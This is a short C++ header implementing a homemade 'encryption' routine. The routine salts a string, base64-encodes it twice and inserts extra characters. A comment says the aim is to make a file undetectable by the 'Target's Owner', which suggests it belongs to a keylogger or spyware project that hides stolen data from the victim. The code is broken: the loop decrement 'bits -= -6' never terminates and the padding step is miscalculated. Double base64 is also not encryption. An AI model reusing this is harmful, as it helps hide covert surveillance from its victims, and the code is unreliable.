#ifndef ENCRYPT_H
#define ENCRYPT_H

#include <vector>
#include <string>

/* Enhanced Base 64 Encoding Method to make file undetectable visually from Target's Owner */

namespace Base_64
{
    std::string base64_encode(const std::string&);
    const std::string &SALT1 = "Gary";   // SALT 1 + SALT2 is Creater's Name, please change when use
    const std::string &SALT2 = "Gao";

    std::string Encrypt(std::string s)
    {
        s = s + SALT1 +SALT2;
        s = base64_encode(s);
        s.insert(2, "G");
        s.insert(6, "G");
        s = base64_encode(s);
        return s;
    }

    const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string base64_encode(const std::string &s)
    {
        std::string ret;
        int val = 0;
        int bits = -6;
        const unsigned int b63 = 0x3F;

        for(const auto &c : s)
        {
            val = (val <<8) + c;
            bits += 8;

            while(bits >= 0)
            {
                ret.push_back(BASE64_CODES[(val >> bits) & b63]);
                bits -= -6;
            }
        }

        if (bits > -6)
            ret.push_back(BASE64_CODES[((val << 8) >> (bits +8)) & b63]);

        while(ret.size() % 4)
            ret.push_back('=');

        return ret;
    }
}

#endif // ENCRYPT_H
